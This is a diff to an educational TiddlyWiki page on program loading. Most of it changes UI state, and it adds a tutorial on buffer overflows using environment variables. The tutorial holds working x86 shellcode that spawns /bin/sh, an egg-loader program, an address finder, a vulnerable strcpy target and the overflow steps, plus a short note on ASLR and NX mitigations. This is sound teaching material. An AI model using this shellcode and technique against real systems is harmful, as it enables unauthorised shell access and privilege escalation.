@@ -458,6 +458,8 @@ Error message and password prompt
 
 <li>Before you Begin</li>
 
+<li>Buffer overflow using environmnent variables</li>
+
 <li>Contents</li>
 
 <li>Contribute/Edit or Save offline content?</li>
@@ -9554,7 +9556,7 @@ exports.details = DetailsWidget;
 <div created="20170908181654869" modified="20170908181654869" title="$:/state/plugin-info-334910430-$:/core---1812962263">
 <pre>contents</pre>
 </div>
-<div created="20170907105631882" modified="20171106103733032" title="$:/state/showeditpreview">
+<div created="20170907105631882" modified="20171114092345740" title="$:/state/showeditpreview">
 <pre>no</pre>
 </div>
 <div created="20170908171547966" modified="20170908180226608" title="$:/state/ShowPaletteEditor">
@@ -9605,14 +9607,14 @@ exports.details = DetailsWidget;
 <div created="20171028180156863" modified="20171113160803905" title="$:/state/toc/Contents-Login Security-209360082">
 <pre>close</pre>
 </div>
-<div created="20171029100419970" modified="20171113184702042" title="$:/state/toc/Contents-Program Execution-209360082">
+<div created="20171029100419970" modified="20171114094016865" title="$:/state/toc/Contents-Program Execution-209360082">
 <pre>close</pre>
 </div>
 <div created="20171029102407659" modified="20171113084531114" title="$:/state/toc/Contents/Program Execution-Program Loading-209360082">
 <pre>open</pre>
 </div>
-<div created="20171112102653681" modified="20171113161547887" title="$:/state/toc/Contents/Program Execution/Program Loading-Linux Loader-209360082">
-<pre>close</pre>
+<div created="20171112102653681" modified="20171114072323945" title="$:/state/toc/Contents/Program Execution/Program Loading-Linux Loader-209360082">
+<pre>open</pre>
 </div>
 <div created="20171031153920976" modified="20171113161544500" title="$:/state/toc/Contents/Program Execution/Program Loading-Windows Loader-209360082">
 <pre>close</pre>
@@ -10359,6 +10361,92 @@ The downside of the HAL model is that it is the biggest single cause of incompat
 ---
 &lt;center&gt; [[Next|Project approach]]&lt;/center&gt;</pre>
 </div>
+<div created="20171114074206271" modified="20171114093845596" tags="" title="Buffer overflow using environmnent variables">
+<pre>!! Storing the Shellcode in the Environment Variable
+In your linux system, first step is to load the environment variables so that it get loaded in memory of every program executed next. We will create a simple program that will do that for us.
+
+
+
+```cpp
+ #define NOP 0x90
+  
+  char shellcode[] =
+  &quot;\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55&quot;
+  &quot;\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80&quot;
+  &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e&quot;
+  &quot;\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50&quot;
+  &quot;\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;;
+  
+   
+int main(void) 
+{
+     
+  char shell[512];    
+  puts(&quot;Eggshell loaded into environment.\n&quot;);
+  memset(shell,NOP,512);     /* fill-up the buffer with NOP */        
+  /* fill-up the shellcode on the second half to the end of buffer */        
+  memcpy(&amp;shell[512-strlen(shellcode)],shellcode,strlen(shellcode));          
+  /* set the environment variable to */  
+  /* EGG and shell as its value, rewrite if needed */              
+  setenv(&quot;EGG&quot;, shell, 1);                
+  /* modify the variable */
+  putenv(shell);                    
+  /* invoke the bash */
+                        
+  system(&quot;bash&quot;);                        
+  return 0;
+                            
+}
+```
+Shellcode consist of assemble instruction set to invoke a shell inside the target program. This shellcode get stored inside EGG env variable.&lt;br/&gt;
+To execute this we will use tcc compile which is same as gcc but have default protections like stack smashing turned off.
+
+
+```bash
+$tcc -g -o eggcode eggcode.c
+```
+After running the //eggshell// you can view the shellcode EGG loaded into your environment varible using env command.&lt;br/&gt;
+&lt;br/&gt;
+[img[loaded shell|images/shellcode.png]]
+&lt;br/&gt;
+
+Now we need to find the address where EGG get loaded inside the program memory. To do that we will use a simple c program(you can also do that through gdb debugger).
+
+```cpp
+#include &lt;unistd.h&gt;
+int main(void)
+{
+
+  printf(&quot;EGG address: 0x%lx\n&quot;, getenv(&quot;EGG&quot;));
+  return 0;
+
+}
+```
+&lt;br/&gt;
+This program will return the address of EGG.&lt;br/&gt;
+[img[shell address|images/findShell.png]]
+&lt;br/&gt;
+This address may differ in your system. You just need to remember this value as it will be used to replace the return address of target program.&lt;br/&gt;
+Now our target program look like this which we are going to exploit.
+
+```cpp
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+void main(int argc, char *argv[]) {
+        char buffer[10];
+        strcpy(buffer, argv[1]);
+        printf(&quot;Done!\n&quot;);
+}
+```
+Now as a argument we will enter 10 'A' to fill the buffer then 4 'B' to fill the base pointer and then our shellcode address. The should be in different order because of little endianess.[[read more about endianess|https://en.wikipedia.org/wiki/Endianness]]&lt;br/&gt;
+[img[exploited|images/shellExploit.png]]
+&lt;br/&gt;
+You can see that instead of displaying output 'done' only, we get a shell inside the program.
+
+---
+[[Learn more about buffer overflow|https://en.wikipedia.org/wiki/Buffer_overflow]]
+</pre>
+</div>
 <div created="20170908043253690" list-before="$:/core/ui/SideBar/Open" modified="20170908084234901" tags="$:/tags/SideBar" title="Contents">
 <pre>&lt;div class=&quot;tc-table-of-contents&quot;&gt;
 &lt;&lt;toc-selective-expandable 'Contents' sort[created]&gt;&gt;
@@ -10370,7 +10458,7 @@ The downside of the HAL model is that it is the biggest single cause of incompat
 <div _canonical_uri="images/62.jpg" created="20170910090008496" modified="20170910090041353" tags="" title="defaultBackground" type="image/jpeg">
 <pre></pre>
 </div>
-<div accordion1="" created="20171111040354076" modified="20171113184705281" tags="[[Linux Loader]]" title="Exploiting Linux Program Loading">
+<div accordion1="" created="20171111040354076" modified="20171114093255458" tags="[[Linux Loader]]" title="Exploiting Linux Program Loading">
 <pre>&lt;$button&gt;
 &lt;$action-setfield accordion1=&quot;open&quot;/&gt;
 Open all
@@ -10392,7 +10480,11 @@ Close all
        int execve(const char *filename, char *const argv[],
                   char *const envp[]);
 ```
+All environment variable present in your shell at the current state get loaded into the memory of program executed through execve. An attacker can use this place to easily store shellcode in there and execute it through buffer overflow attack.This type of attack can be really helpful in the scenario where the original buffer size inside program is quite small to store shellcode.&lt;br/&gt;
+To stop these type of attacks os vendors have proposed two mitigation techniques ASLR (Address space layout randomization) and NX stack (No execution of stack).Altough the buffer overflow can still be possible with these mitigation techniques.
 
+---
+[[Detailed attack procedure here|Buffer overflow using environmnent variables]]
 
 &lt;/$details&gt;</pre>
 </div>
